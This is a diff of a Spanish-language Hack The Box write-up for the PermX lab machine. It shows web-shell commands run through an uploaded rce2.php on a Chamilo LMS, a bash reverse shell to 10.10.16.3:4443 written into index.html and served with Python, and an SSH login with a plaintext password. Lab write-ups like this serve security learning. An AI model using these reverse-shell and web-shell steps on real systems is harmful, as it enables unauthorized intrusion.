@@ -154,6 +154,8 @@ The file has successfully been uploaded.
 
 /home/kali/Documents/htb/machines/permx:-$ curl 'http://lms.permx.htb/main/inc/lib/javascript/bigupload/files/rce2.php?cmd=whoami'
 www-data
+
+/home/kali/Documents/htb/machines/permx:-$ echo '#!/bin/bash\n\nbash -i >& /dev/tcp/10.10.16.3/4443 0>&1' > index.html
 ```
 
 Luego de crear el archivo 'index', levanto un servidor con Python para compartir el archivo.
@@ -161,8 +163,6 @@ Luego de crear el archivo 'index', levanto un servidor con Python para compartir
 Ejecutando un 'curl' hacia mi IP, la página 'lms.permx.htb' accede correctamente al archivo.
 
 ```terminal
-/home/kali/Documents/htb/machines/permx:-$ echo '#!/bin/bash\n\nbash -i >& /dev/tcp/10.10.16.3/4443 0>&1' > index.html
-
 /home/kali/Documents/htb/machines/permx:-$ python3 -m http.server 80
 
 /home/kali/Documents/htb/machines/permx:-$ curl 'http://lms.permx.htb/main/inc/lib/javascript/bigupload/files/rce2.php?cmd=curl+10.10.16.3'
@@ -204,7 +204,7 @@ www-data@pemrx:/var/www/chamilo$ ls -l /home
 drwxr-x--- 5 mtz mtz 4096 Nov 8 22:42 mtz
 
 /home/kali/Documents/htb/machines/permx:-$ ssh mtz@10.10.11.23
-Password: 03F6lY3uXAP2bkW8
+mtz@10.10.11.23's Password: 03F6lY3uXAP2bkW8
 
 mtz@permx:~$ cat user.txt
 ```
